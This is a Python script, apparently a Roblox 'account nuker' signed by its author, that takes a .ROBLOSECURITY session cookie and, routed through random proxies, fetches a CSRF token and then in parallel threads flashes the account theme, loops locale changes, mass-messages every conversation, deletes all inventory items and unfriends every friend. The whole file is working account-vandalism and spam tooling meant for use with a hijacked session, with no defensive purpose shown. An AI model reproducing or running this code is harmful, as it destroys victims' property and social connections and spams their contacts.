import requests
import random
from termcolor import cprint
import threading
import time
proxies = open("proxies.txt", "r").read().splitlines()
def proxy():
  return random.choice(proxies)
def getXsrf(cookie):
      xsrfRequest = requests.post("https://auth.roblox.com/v2/logout", cookies={
          '.ROBLOSECURITY': cookie
      }, proxies={"ftp":proxy()})
      return xsrfRequest.headers["x-csrf-token"]
def flash(cookie):
  def waitForInput():
    global goOn
    input()
    goOn = False
  threading.Thread(target=waitForInput).start()
  while goOn:
    print(goOn)
    cprint("Press enter to stop", "yellow")
    cprint("Flashing....", "blue")
    cprint("Flashing....", "magenta")
    requests.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers,data={"themeType": "Light"}, proxies={"ftp":proxy()})
    requests.patch("https://accountsettings.roblox.com/v1/themes/user",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers,data={"themeType": "Dark"}, proxies={"ftp":proxy()})
  else:
    for i in 'Done Nuking...':
      time.sleep(0.1)
      cprint(i, "green",end="")
def changeLanguage(cookie):
  while True:
    requests.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': str(cookie)},headers=headers,data={"supportedLocaleCode": "ja_jp"}, proxies={"ftp":proxy()})
    requests.post("https://locale.roblox.com/v1/locales/set-user-supported-locale",cookies={'.ROBLOSECURITY': str(cookie)},headers=headers,data={"supportedLocaleCode": "ko_kr"}, proxies={"ftp":proxy()})
def messageAll(cookie, message):
  conversations = requests.get("https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers, proxies={"ftp":proxy()}).json()
  for conversation in conversations:
    cprint(f"Sent message to {conversation['id']}", "green")
    print(requests.post("https://chat.roblox.com/v2/send-message",data={"conversationId": conversation["id"], "message": message}, cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers, proxies={"ftp":proxy()}))
def removeItems(cookie):
  items = requests.get(f"https://www.roblox.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={userid}",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers, proxies={"ftp":proxy()}).json()["Data"]["Items"]
  for item in items:
    time.sleep(4)
    id = item["Item"]["AssetId"]
    response = requests.post("https://www.roblox.com/asset/delete-from-inventory", data={"assetId": str(id)},cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers, proxies={"ftp":proxy()})
    if response.status_code == 429:
      time.sleep(10)
      response = requests.post("https://www.roblox.com/asset/delete-from-inventory", data={"assetId": id},cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers, proxies={"ftp":proxy()})
      print(response)
      cprint(f"Removed {id} from user's inventory", "green")
    else:
      cprint(f"Removed {id} from user's inventory", "green")
  cprint("Removed all items from user's inventory", "green")
  time.sleep(1)
def unfriend(cookie):
  friends = requests.get(f"https://friends.roblox.com/v1/users/{userid}/friends", cookies={'.ROBLOSECURITY': str(cookie)}, proxies={"ftp":proxy()}).json()['data']
  friendIds = []
  for i in friends:
    friendIds.append(i['id'])
  for i in friendIds:
    time.sleep(0.1)
    print(requests.post(f"https://friends.roblox.com/v1/users/{i}/unfriend",cookies={'.ROBLOSECURITY': str(cookie)}, headers=headers, proxies={"ftp":proxy()}).text)
    cprint(f"Unfriended {i}!", "green")
  cprint("Unfriended All!", "green")
def checkCookie():
  global headers
  global userid
  cprint("Enter Your Cookie Below:", 'magenta')
  cookie = input()
  cprint("Enter Your mass dm message below:", 'magenta')
  message = input()
  check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)})
  if check.status_code ==200:
    headers={'X-CSRF-TOKEN': getXsrf(cookie)}
    userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
    userid = userdata['id'] #user id
    threading.Thread(target=flash, args=(cookie,)).start()
    threading.Thread(target=unfriend, args=(cookie,)).start()
    threading.Thread(target=changeLanguage, args=(cookie,)).start()
    threading.Thread(target=removeItems, args=(cookie,)).start()
    threading.Thread(target=messageAll, args=(cookie,message,)).start()
  else:
    cprint("Invalid Cookie", 'red')
    time.sleep(1.4)
    checkCookie()
if __name__ == '__main__':
  goOn = True
  checkCookie()
  # Coded by Ice Bear#0167
